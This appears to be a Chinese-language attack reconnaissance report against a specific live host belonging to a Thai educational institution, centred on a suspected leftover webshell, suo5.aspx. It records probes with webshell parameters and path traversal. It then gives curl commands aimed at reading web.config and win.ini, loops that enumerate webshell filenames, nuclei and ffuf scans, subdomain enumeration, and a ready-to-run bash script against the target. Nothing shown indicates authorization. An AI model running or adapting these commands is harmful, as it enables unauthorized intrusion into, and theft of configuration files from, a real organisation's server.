# 目标分析报告：bppis.bpi.ac.th

## 目标信息
- **URL**: https://bppis.bpi.ac.th/Bundles/fonts/suo5.aspx
- **域名**: bppis.bpi.ac.th（泰国教育机构）
- **文件路径**: /Bundles/fonts/suo5.aspx
- **文件名可疑度**: ⚠️ 高（suo5.aspx疑似webshell）

## 技术栈识别
```
Server: Microsoft-IIS/10.0
框架: ASP.NET 4.0.30319
协议: HTTP/2
状态码: 200 OK
Content-Length: 0（空响应）
```

## 测试结果

### 1. 基础探测
```bash
# 响应头
HTTP/2 200
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
Content-Type: text/html
Content-Length: 0
```

### 2. Webshell参数测试（失败）
测试参数：cmd, command, exec, shell, action, x, c
- GET参数：无响应
- POST参数：无响应
- 所有常见webshell参数均无响应

### 3. 目录遍历测试
```bash
# 目录访问
/Bundles/fonts/ → 403 Forbidden

# 路径遍历
/Bundles/fonts/../web.config → 404
/Bundles/fonts/../default.aspx → 404
```

## 攻击面分析

### 高价值发现
1. **文件存在但无内容**
   - 可能是空文件/占位符
   - 可能是需要特定触发条件的webshell
   - 可能是被清理的webshell残留

2. **ASP.NET 4.0环境**
   - 可能存在已知漏洞
   - 可测试反序列化、文件上传等

3. **IIS 10.0**
   - 可能存在配置错误
   - 可测试目录遍历、文件读取

### 进一步测试方案

#### 方案1：文件包含测试
```bash
# 测试文件包含
curl "https://bppis.bpi.ac.th/Bundles/fonts/suo5.aspx?file=web.config" -k
curl "https://bppis.bpi.ac.th/Bundles/fonts/suo5.aspx?path=C:\\Windows\\win.ini" -k
```

#### 方案2：其他可疑文件枚举
```bash
# 枚举类似文件
for i in {1..10}; do
    curl -s -o /dev/null -w "%{http_code}" "https://bppis.bpi.ac.th/Bundles/fonts/suo$i.aspx" -k
done

# 常见webshell文件名
for name in shell cmd webshell backdoor; do
    curl -s -o /dev/null -w "%{http_code}" "https://bppis.bpi.ac.th/Bundles/fonts/$name.aspx" -k
done
```

#### 方案3：ASP.NET漏洞扫描
```bash
# Nuclei扫描
nuclei -u "https://bppis.bpi.ac.th" -t ~/nuclei-templates/cves/ -t ~/nuclei-templates/vulnerabilities/ -severity critical,high

# 特定漏洞测试
# CVE-2020-1472 (Zerologon)
# CVE-2021-26855 (Exchange SSRF)
# ASP.NET反序列化
```

#### 方案4：目录枚举
```bash
# 目录扫描
ffuf -u "https://bppis.bpi.ac.th/FUZZ" -w /usr/share/wordlists/dirb/common.txt -k -mc 200,301,302,403

# 文件枚举
ffuf -u "https://bppis.bpi.ac.th/Bundles/fonts/FUZZ.aspx" -w /usr/share/wordlists/dirb/common.txt -k -mc 200
```

#### 方案5：子域名枚举
```bash
# 子域名发现
subfinder -d bpi.ac.th -all
amass enum -passive -d bpi.ac.th
```

## 快速测试命令

### 完整测试脚本
```bash
#!/bin/bash
TARGET="https://bppis.bpi.ac.th/Bundles/fonts/suo5.aspx"

echo "[+] 测试1: 文件包含"
curl -s "$TARGET?file=web.config" -k | head -20
curl -s "$TARGET?path=C:\\Windows\\win.ini" -k | head -20

echo "[+] 测试2: 其他参数"
for param in file path data input id name; do
    curl -s "$TARGET?$param=test" -k | head -10
done

echo "[+] 测试3: 类似文件枚举"
for i in {1..10}; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://bppis.bpi.ac.th/Bundles/fonts/suo$i.aspx" -k)
    [ "$code" = "200" ] && echo "[+] suo$i.aspx exists (HTTP $code)"
done

echo "[+] 测试4: 目录扫描"
ffuf -u "https://bppis.bpi.ac.th/Bundles/fonts/FUZZ.aspx" -w /usr/share/wordlists/dirb/common.txt -k -mc 200 -t 20
```

## 结论

**当前状态**: 文件存在但无响应内容，疑似空文件或需要特定触发条件

**建议行动**:
1. 枚举其他类似文件（suo1-10.aspx）
2. 测试文件包含漏洞
3. 扫描整个域名寻找其他入口点
4. 测试ASP.NET已知漏洞

**优先级**: 中（文件存在但无直接利用点，需进一步枚举）
